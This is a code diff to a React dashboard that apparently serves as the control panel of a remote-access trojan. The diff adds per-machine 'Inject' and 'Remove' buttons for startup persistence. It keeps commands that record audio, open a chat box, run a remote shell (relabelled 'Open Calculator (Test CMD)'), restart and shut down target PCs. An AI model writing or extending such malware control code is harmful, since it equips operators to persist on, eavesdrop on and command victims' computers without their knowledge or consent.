@@ -140,7 +140,14 @@ export default function Dashboard() {
                 </div>
                 <div className="bg-white/5 p-3 rounded-lg border border-white/5">
                   <span className="text-gray-500 text-xs block mb-1 flex items-center gap-1"><Shield size={12}/> Startup</span>
-                  <span className={pc.startup_enabled ? 'text-green-400 font-medium' : 'text-gray-400'}>{pc.startup_enabled ? 'Injected' : 'None'}</span>
+                  <div className="flex items-center justify-between">
+                    <span className={pc.startup_enabled ? 'text-green-400 font-medium' : 'text-gray-400'}>{pc.startup_enabled ? 'Injected' : 'None'}</span>
+                    {pc.startup_enabled ? (
+                      <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup_remove')} className="text-[10px] bg-red-500/20 text-red-400 px-1 rounded hover:bg-red-500/40">Remove</button>
+                    ) : (
+                      <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup')} className="text-[10px] bg-green-500/20 text-green-400 px-1 rounded hover:bg-green-500/40">Inject</button>
+                    )}
+                  </div>
                 </div>
               </div>
               <div className="grid grid-cols-4 gap-2">
@@ -149,8 +156,7 @@ export default function Dashboard() {
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'audio')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Record Audio"><Mic size={18}/></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18}/></button>
                 
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'cmd')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Remote Shell"><Terminal size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-green-400 transition-colors" title="Inject Startup"><Shield size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'cmd')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Calculator (Test CMD)"><Terminal size={18}/></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18}/></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18}/></button>
               </div>
